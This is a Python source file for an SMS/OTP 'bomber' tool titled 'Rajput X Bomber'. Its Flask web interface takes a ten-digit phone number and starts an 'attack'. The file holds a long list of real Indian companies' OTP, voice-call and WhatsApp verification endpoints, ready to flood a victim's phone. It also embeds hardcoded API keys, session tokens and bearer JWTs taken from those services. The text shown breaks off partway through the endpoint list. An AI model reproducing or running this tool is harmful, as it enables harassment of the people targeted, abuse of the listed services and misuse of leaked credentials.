import threading
import sys
import os
import asyncio
import aiohttp
import functools
import time
from flask import Flask, render_template_string, request, jsonify, session, redirect
from kivy.app import App
from kivy.clock import Clock
from kivy.uix.label import Label
from kivy.core.window import Window
from kivy.utils import get_color_from_hex
from kivy.core.audio import SoundLoader # Music Library Added

# ==========================================
# 1. HTML DESIGN (Embedded)
# ==========================================
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RAJPUT X BOMBER</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; width: 100%; overflow: hidden; background-color: #0d001a; font-family: 'Courier New', monospace; color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; }
        #particles-js { position: absolute; width: 100%; height: 100%; background-color: #0d001a; z-index: 0; }
        .container { position: relative; z-index: 10; background: rgba(0, 0, 0, 0.7); backdrop-filter: blur(10px); border: 1px solid rgba(170, 0, 255, 0.4); box-shadow: 0 0 40px rgba(170, 0, 255, 0.3); border-radius: 20px; padding: 30px; width: 90%; max-width: 450px; text-align: center; }
        h1 { color: #ff00ff; text-shadow: 0 0 10px #ff00ff; margin-bottom: 5px; font-size: 28px; font-weight: 900; }
        .tagline { color: #e0e0e0; font-size: 12px; margin-bottom: 25px; opacity: 0.9; }
        input[type="text"] { background: rgba(0, 0, 0, 0.6); border: 2px solid #555; color: #fff; padding: 15px; width: 85%; font-size: 20px; text-align: center; border-radius: 10px; margin-bottom: 25px; outline: none; }
        input[type="text"]:focus { border-color: #ff00ff; box-shadow: 0 0 15px rgba(255, 0, 255, 0.4); }
        .btn-group { display: flex; gap: 15px; }
        button { flex: 1; padding: 15px; font-size: 18px; font-weight: bold; border: none; border-radius: 10px; color: white; cursor: pointer; }
        .btn-start { background: linear-gradient(135deg, #00b300, #00ff41); box-shadow: 0 0 20px rgba(0, 255, 65, 0.4); }
        .btn-stop { background: linear-gradient(135deg, #ff0000, #ff4d4d); box-shadow: 0 0 20px rgba(255, 0, 0, 0.4); }
        .status-msg { margin-top: 15px; font-weight: bold; min-height: 24px; color: #00ffff; }
        .terminal { margin-top: 25px; background: rgba(0, 0, 0, 0.9); border: 1px solid rgba(255, 0, 255, 0.3); height: 150px; overflow-y: auto; text-align: left; padding: 10px; font-size: 12px; color: #00ffff; display: none; font-family: monospace; }
        .footer-text { margin-top: 15px; font-size: 10px; color: rgba(255,255,255,0.6); z-index: 10; }
    </style>
</head>
<body>
    <div id="particles-js"></div>
    <div class="container">
        <h1>Rajput X Bomber</h1>
        <div class="tagline">⚡ Ultra Fast API Attack ⚡</div>
        <input type="text" id="phone" placeholder="ENTER NUMBER" maxlength="10">
        <div class="btn-group">
            <button class="btn-start" onclick="startAttack()">START 🚀</button>
            <button class="btn-stop" onclick="stopAttack()">STOP 🛑</button>
        </div>
        <div class="status-msg" id="status">SYSTEM READY</div>
        <div class="terminal" id="terminal"></div>
    </div>
    <div class="footer-text">Powered by: <b>snxrajput</b></div>
    <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
    <script>
        particlesJS("particles-js", {"particles":{"number":{"value":80},"color":{"value":["#ff00ff","#00ffff"]},"shape":{"type":"circle"},"opacity":{"value":0.5},"size":{"value":3},"line_linked":{"enable":true,"color":"#880088"},"move":{"enable":true,"speed":3}},"interactivity":{"events":{"onhover":{"enable":true,"mode":"repulse"}}}});
        let logInterval;
        async function startAttack() {
            let phone = document.getElementById("phone").value;
            let status = document.getElementById("status");
            let term = document.getElementById("terminal");
            if(phone.length!==10){status.innerText="❌ INVALID NUMBER"; return;}
            status.innerText="⚡ STARTING...";
            try {
                let res = await fetch('/start', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone})});
                let data = await res.json();
                if(data.status==="success"){
                    status.innerText="🚀 ATTACK RUNNING...";
                    term.style.display="block"; term.innerHTML="<div>> Connecting...</div>";
                    logInterval=setInterval(async()=>{
                        let lres=await fetch('/logs/'+phone); let ldata=await lres.json();
                        term.innerHTML=""; ldata.logs.forEach(l=>{let p=document.createElement("p");p.innerText="> "+l;term.appendChild(p)});
                        term.scrollTop=term.scrollHeight;
                    },1000);
                } else { status.innerText=data.message; }
            } catch(e){status.innerText="ERROR";}
        }
        async function stopAttack() {
            let phone=document.getElementById("phone").value;
            clearInterval(logInterval);
            await fetch('/stop', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone})});
            document.getElementById("status").innerText="🛑 STOPPED";
            setTimeout(()=>location.reload(),1500);
        }
    </script>
</body>
</html>
'''

# ==========================================
# 2. FLASK SERVER (Logic)
# ==========================================
app = Flask(__name__)
app.secret_key = "secret_key"
active_attacks = {}
attack_logs = {}
PROTECTED = ["9876543210"]

# API List (Sample - Add yours here)
API_CONFIGS = [
    {"url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json", "X-Session-Token": "7836451c-4b02-4a00-bde1-15f7fb50312a"}, "data": lambda phone: f'{{"captcha":null,"phoneCode":"+91","telephone":"{phone}"}}'},
    {"url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda phone: f"check_mobile_number=1&contact={phone}"},
    {"url": "https://www.shemaroome.com/users/resend_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda phone: f"mobile_no=%2B91{phone}"},
    {"url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0", "method": "POST", "headers": {"content-type": "application/json", "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797"}, "data": lambda phone: f'{{"phone_number":{{"number":"{phone}","country_code":"+91"}}}}'},
    {"url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", "method": "POST", "headers": {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "content-type": "application/json; charset=UTF-8"}, "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}'},
    {"url": "https://api.bikefixup.com/api/v2/send-registration-otp", "method": "POST", "headers": {"content-type": "application/json; charset=UTF-8"}, "data": lambda phone: f'{{"phone":"{phone}","app_signature":"4pFtQJwcz6y"}}'},
    {"url": "https://services.rappi.com/api/rappi-authentication/login/whatsapp/create", "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8"}, "data": lambda phone: f'{{"phone":"{phone}","country_code":"+91"}}'},
    {"url": "https://stratzy.in/api/web/auth/sendPhoneOTP", "method": "POST", "headers": {"content-type": "application/json", "origin": "https://stratzy.in"}, "data": lambda phone: f'{{"phoneNo":"{phone}"}}'},
    {"url": "https://stratzy.in/api/web/whatsapp/sendOTP", "method": "POST", "headers": {"content-type": "application/json", "origin": "https://stratzy.in"}, "data": lambda phone: f'{{"phoneNo":"{phone}"}}'},
    {"url": "https://wellacademy.in/store/api/numberLoginV2", "method": "POST", "headers": {"content-type": "application/json; charset=UTF-8"}, "data": lambda phone: f'{{"contact_no":"{phone}"}}'},
    {"url": "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json", "identifier": "home"}, "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1"}}'},
    {"url": "https://api.servetel.in/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8"}, "data": lambda phone: f"mobile_number={phone}"},
    {"url": "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"mobile_number={phone}"},
    {"url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://www.beepkart.com"}, "data": lambda phone: f'{{"city":362,"fullName":"","phone":"{phone}","source":"myaccount"}}'},
    {"url": "https://lendingplate.com/api.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda phone: f"mobiles={phone}&resend=Resend&clickcount=3"},
    {"url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "method": "POST", "headers": {"Content-Type": "application/json", "client-id": "snitch_secret"}, "data": lambda phone: f'{{"mobile_number":"+91{phone}"}}'},
    {"url": "https://ekyc.daycoindia.com/api/nscript_functions.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda phone: f"api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp"},
    {"url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST", "headers": {"content-type": "application/json; charset=utf-8"}, "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'},
    {"url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","selectedCountryCode":"+91"}}'},
    {"url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/", "method": "POST", "headers": {"content-type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda phone: f"mobile={phone}"},
    {"url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"phone={phone}&countryCode=IN"},
    {"url": "https://www.cossouq.com/mobilelogin/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"mobilenumber={phone}&otptype=register"},
    {"url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {"url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json", "gk-request-id": "a0cecd38-e690-48d5-ab80-b9d2feed3761"}, "data": lambda phone: f'{{"phone":"{phone}","country":"in"}}'},
    {"url": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=false", "method": "GET", "headers": {"Host": "www.jockey.in"}, "data": None},
    {"url": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true", "method": "GET", "headers": {"Host": "www.jockey.in"}, "data": None},
    {"url": "https://prodapi.newme.asia/web/otp/request", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile_number":"{phone}","resend_otp_request":true}}'},
    {"url": lambda phone: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}", "method": "GET", "headers": {}, "data": None},
    {"url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}'},
    {"url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://www.foxy.in"}, "data": lambda phone: f'{{"guest_token":"01943c60-aea9-7ddc-b105-e05fbcf832be","user":{{"phone_number":"+91{phone}"}},"device":null,"invite_code":""}}'},
    {"url": "https://auth.eka.care/auth/init", "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8"}, "data": lambda phone: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{phone}"}},"type":"mobile"}}'},
    {"url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json", "Accept": "application/json"}, "data": lambda phone: f'{{"user":{{"phone_number":"+91{phone}"}},"via":"whatsapp"}}'},
    {"url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://smytten.com"}, "data": lambda phone: f'{{"ad_id":"","device_info":{{}},"device_id":"","app_version":"","device_token":"","device_platform":"web","phone":"{phone}","email":"test@example.com"}}'},
    {"url": "https://api.wakefit.co/api/consumer-sms-otp/", "method": "POST", "headers": {"Content-Type": "application/json", "API-Secret-Key": "ycq55IbIjkLb", "API-Token": "c84d563b77441d784dce71323f69eb42"}, "data": lambda phone: f'{{"mobile":"{phone}","whatsapp_opt_in":1}}'},
    {"url": "https://www.caratlane.com/cg/dhevudu", "method": "POST", "headers": {"Content-Type": "application/json", "Authorization": "b945ebaf43ed7541d49cfd60bd82b81908edff8d465caecfe58deef209"}, "data": lambda phone: f'{{"query":"mutation {{SendOtp(input: {{mobile: \\"{phone}\\",isdCode: \\"91\\",otpType: \\"registerOtp\\"}}) {{status {{message code}}}}}}"}}'},
    {"url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}'},
    {"url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": lambda phone: f'{{"number":"{phone}","otp_on_call":true}}'},
    {"url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda phone: f"mobile={phone}"},
    {"url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"url": "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"phone={phone}&action=voice_otp"},
    {"url": "https://accounts.paytm.com/signin/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"url": "https://www.zomato.com/php/o2_api_handler.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"phone={phone}&type=voice"},
    {"url": "https://www.makemytrip.com/api/4/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"url": "https://www.goibibo.com/user/voice-otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"url": "https://api.olacabs.com/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"url": "https://auth.uber.com/v2/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", "method": "POST", "headers": {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "content-type": "application/json; charset=UTF-8"}, "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}'},
    {"url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"user":{{"phone_number":"+91{phone}"}},"via":"whatsapp"}}'},
    {"url": "https://stratzy.in/api/web/whatsapp/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNo":"{phone}"}}'},
    {"url": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true", "method": "GET", "headers": {}, "data": None},
    {"url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}'},
    {"url": "https://auth.eka.care/auth/init", "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8"}, "data": lambda phone: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{phone}"}},"type":"mobile"}}'},
    {"url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneCode":"+91","telephone":"{phone}"}}'},
    {"url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"phone={phone}&countryCode=IN"},
    {"url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"url": "https://api.wakefit.co/api/consumer-sms-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"url": "https://api.byjus.com/v2/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"url": "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'},
    {"url": "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"mobile_number={phone}"},
    {"url": "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"content-type": "application/json; charset=utf-8"}, "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}'},
    {"url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST", "headers": {"content-type": "application/json; charset=utf-8"}, "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'},
    {"url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile_number":"+91{phone}"}}'},
    {"url": "https://ekyc.daycoindia.com/api/nscript_functions.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda phone: f"api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp"},
    {"url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","city":362}}'},
    {"url": "https://lendingplate.com/api.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda phone: f"mobiles={phone}&resend=Resend"},
    {"url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {"url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","country":"in"}}'},
    {"url": "https://prodapi.newme.asia/web/otp/request", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile_number":"{phone}","resend_otp_request":true}}'},
    {"url": lambda phone: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}", "method": "GET", "headers": {}, "data": None},
    {"url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","email":"test@example.com"}}'},
    {"url": "https://www.caratlane.com/cg/dhevudu", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"query":"mutation {{SendOtp(input: {{mobile: \\"{phone}\\",isdCode: \\"91\\",otpType: \\"registerOtp\\"}}) {{status {{message code}}}}}}"}}'},
    {"url": "https://api.bikefixup.com/api/v2/send-registration-otp", "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8"}, "data": lambda phone: f'{{"phone":"{phone}","app_signature":"4pFtQJwcz6y"}}'},
    {"url": "https://wellacademy.in/store/api/numberLoginV2", "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8"}, "data": lambda phone: f'{{"contact_no":"{phone}"}}'},
    {"url": "https://api.servetel.in/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8"}, "data": lambda phone: f"mobile_number={phone}"},
    {"url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda phone: f"check_mobile_number=1&contact={phone}"},
    {"url": "https://www.shemaroome.com/users/resend_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda phone: f"mobile_no=%2B91{phone}"},
    {"url": "https://www.cossouq.com/mobilelogin/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"mobilenumber={phone}&otptype=register"},
    {"url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda phone: f"mobile={phone}"},
    {"url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","selectedCountryCode":"+91"}}'},

    # --- PART 2: NEW APIs FROM ZIP (52) ---
    {"url": "https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code", "method": "POST", "headers": {"content-type": "application/json", "origin": "https://www.hoichoi.tv"}, "data": lambda phone: f'{{"phoneNumber":"+91{phone}"}}'},
    {"url": "https://www.shemaroome.com/users/mobile_no_signup", "method": "POST", "headers": {"content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://www.shemaroome.com"}, "data": lambda phone: f"mobile_no=+91{phone}&registration_source=organic"},
    {"url": "https://www.hathway.com/api/sendOtp", "method": "POST", "headers": {"content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://www.hathway.com"}, "data": lambda phone: f"c_contact={phone}"},
    {"url": "https://www.licious.in/api/login/signup", "method": "POST", "headers": {"content-type": "application/json", "origin": "https://www.licious.in"}, "data": lambda phone: f'{{"phone":"{phone}","captcha_token":""}}'},
    {"url": "https://accounts.box8.co.in/customers/sign_up", "method": "POST", "headers": {"content-type": "application/json", "origin": "https://box8.in", "authorization": "Bearer eyJraWQiOiIxZWQ1ZDFiNjI5NDY0MmFlOWEyZGU2NDQzZWZlZmI2Y2I8OTRkMjAwNjU0NGUzYzljOWE3N2JkM2UwYzkyNThhIiwiYWxnIjoiUlMyNTYifQ.eyJpYXQiOjE3NTcwODU4MjcsImV4cCI6MTc1NzIwNTAwMCwic3NpZCI6IjRiNzg3NWMxLTE4MzctNDg3MS05MmI4LTFmN2RmMDc5NzUzYzE3NTcwODU4MjciLCJhY2Nfd3lwZSI6IkFub255bW91c0FjY291bnQiLCJwbGF0Zm9ybSI6IndlYiIsImRldmljZV9pZCI6ImFqdHU2ZnhhLWhhY2stOXQ4ei14enB2LXBoeXA0czdzZTd1OSIsImJyYW5kX2lkIjoxLCJhdWQiOiJjdXN0b21lciIsImlzcyI6ImFjY291bnRzLmJveDguY28uaW4ifQ.Zycdly8bvjNtJGk2UKH-vxcMc8JS11pNhGV9mJff0BgN7lkSgBqWds95-dsrvlQ3fBw3Fzf0nwojxbqra1OBK9ATL5g8f3AI2iEZk0bhI2wNivt1tJ8hLMxWu3wK5TTHtDsoj6MYh85pVXgH00TNYMARUyOQFNuqeMBLpWIqASBe-6CJlSosTqvcu1XMvBr7Ie1nPBL4ZDR3ZIbLAp6HQ-PVxKKrhdEn_lzOk0NqCow2SZZbG7BSn8E16nDTW6YvEi2-HFYdbWgcY-vDiQUhl-nves4RRz9LiAvr6X3ZYed7CteGa4X4LSGlmf5jl1KHM7NwEeoZwbYDVVIaFQc5xPNVKCFvdFhU9rDfO-G_ytz8lbqA3qMnLp56Vcp38eACzKAKVN3my946kGOQiOV80lxuswUIb32ZXAG6GiKbT-REau76CGHwm0wjqWRmNVNhedUPWAo-Mv86-PB4yLVksedNJK5Q5Sgm0VVra_TWNcZkwKqtYIzSM15pLTbOgEeUkRRBQjmyyLw7o_j8BjdYTSo5RjyeTbYG9AjzLz7dfJPVybwuel5cLggtnET4jWzPlm42fJj3aeqcjhsdKMKS3yhvV65zrzGYLsMc4xqsGIW1b2ZBPcFC1z6zWG1tX0ENOQnR2E_gAG6OThbkhIeRf5Y58yBgfFFSZTbT4hfrqwM"}, "data": lambda phone: f'{{"phone_no":"{phone}","name":"Karatos","email":"lustion@gmail.com","password":"karatospy@"}}'},
    {"url": "https://api.lazypay.in/api/lazypay/v0/userportal/sendOtp", "method": "POST", "headers": {"content-type": "application/json", "origin": "https://lazypay.in"}, "data": lambda phone: f'{{"username":"{phone}"}}'},
    {"url": "https://api.kreditbee.in/v1/me/otp", "method": "PUT", "headers": {"content-type": "application/json", "authority": "api.kreditbee.in", "origin": "https://pwa-web1.kreditbee.in"}, "data": lambda phone: f'{{"reason":"loginOrRegister","mobile":"{phone}","appsflyerId":"650acda6-5926-435b-bb5c-e7114b6ac279-p"}}'},
    {"url": "https://api.gopaysense.com/users/otp", "method": "POST", "headers": {"content-type": "application/json", "origin": "https://www.gopaysense.com"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"url": "https://www.hotstar.com/api/internal/bff/v2/freshstart/pages/1/spaces/1/widgets/8?action=userRegistration", "method": "POST", "headers": {"content-type": "application/json", "origin": "https://www.hotstar.com", "x-hs-platform": "mweb"}, "data": lambda phone: f'{{"body":{{"@type":"type.googleapis.com/feature.login.InitiatePhoneLoginRequest","initiate_by":0,"recaptcha_token":"","phone_number":"{phone}"}}}}'},
    {"url": "https://auth.zee5.com/v1/user/sendotp", "method": "POST", "headers": {"content-type": "application/json", "origin": "https://www.zee5.com"}, "data": lambda phone: f'{{"phoneno":"91{phone}"}}'},
    {"url": "https://production.apna.co/api/userprofile/v1/otp/", "method": "POST", "headers": {"content-type": "application/json", "origin": "https://employer.apna.co"}, "data": lambda phone: f'{{"phone_number":"91{phone}","retries":0,"hash_type":"employer","source":"employer"}}'},
    {"url": "https://userservice.goibibo.com/ext/web/pwa/send/token/OTP_IS_REG", "method": "POST", "headers": {"content-type": "application/json", "authorization": "h4nhc9jcgpAGIjp", "origin": "https://www.goibibo.com"}, "data": lambda phone: f'{{"loginId":"{phone}","countryCode":91,"channel":["MOBILE"],"type":6,"appHashKey":"@www.goibibo.com #"}}'},
    {"url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"content-type": "application/json", "origin": "https://www.lenskart.com", "X-Session-Token": "542cdf49-0851-40fb-af7f-c921e3e261d4"}, "data": lambda phone: f'{{"captcha":null,"phoneCode":"+91","telephone":"{phone}"}}'},
    {"url": "https://www.foodstories.shop/shop/", "method": "POST", "headers": {"content-type": "text/plain;charset=UTF-8", "origin": "https://www.foodstories.shop"}, "data": lambda phone: f'[{{"mobilenumber":"{phone}"}}]'},
    {"url": "https://pvt-product.cars24.com/pp/auth/mobile/otp/send/", "method": "POST", "headers": {"content-type": "application/json", "origin": "https://www.cars24.com", "x-api-key": "qGuMZcWGxZpgd8uSH4rgkal4v1evAlCd"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"url": "https://anthe.aakash.ac.in/anthe/global-otp-verify", "method": "POST", "headers": {"content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://anthe.aakash.ac.in"}, "data": lambda phone: f"mobileparam={phone}&global_data_id=anthe-otp-verify&student_name=&corpid="},
    {"url": "https://sotp-api.lucentinnovation.com/v6/otp", "method": "POST", "headers": {"content-type": "application/json", "origin": "https://eatanytime.in", "shop_name": "eat-anytime.myshopify.com"}, "data": lambda phone: f'{{"username":"{phone}","type":"mobile","domain":"eatanytime.in"}}'},
    {"url": "https://apigateway.pantaloons.com/common/sendOTP", "method": "POST", "headers": {"content-type": "application/json", "origin": "https://www.pantaloons.com", "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlblBheWxvYWQiOnsiZGV2aWNlSWQiOiJlYTFkZDQ3YS00ZGI5LTRhZmMtYTlmZC1mODJhMzA2Y2Q4ZmIifSwiaWF0IjoxNzU3MDEyNjkzfQ.OKeRLCKBP3jAka6N_YOqi5rK2N8s7EzcHpKLycI-tNU"}, "data": lambda phone: f'{{"brand":"pantaloons","validateHash":false,"utmSource":"-1","version":3.4,"geoLocation":{{"latitude":343}},"deviceType":"mobile","fcmToken":"111","mobile":"{phone}","mode":"verify","cartId":0,"customerId":0,"sliderSource":"-1","cartOperation":"add","deviceId":"ea1dd47a-4db9-4afc-a9fd-f82a306cd8fb","deviceToken":"cef5f364dcdce7fb722187800f0466ee.1757012693","sessionId":"cef5f364dcdce7fb722187800f0466ee","hash":"c9e5eafc4163f586b6ecbdabe7d9a284"}}'},
    {"url": "https://m.snapdeal.com/signupCompleteAjax", "method": "POST", "headers": {"content-type": "application/json;charset=UTF-8", "origin": "https://m.snapdeal.com"}, "data": lambda phone: f'{{"j_password":null,"j_mobilenumber":"{phone}","agree":true,"j_confpassword":null,"journey":"mobile","numberEdit":false,"j_fullname":"Guest","swp":true}}'},
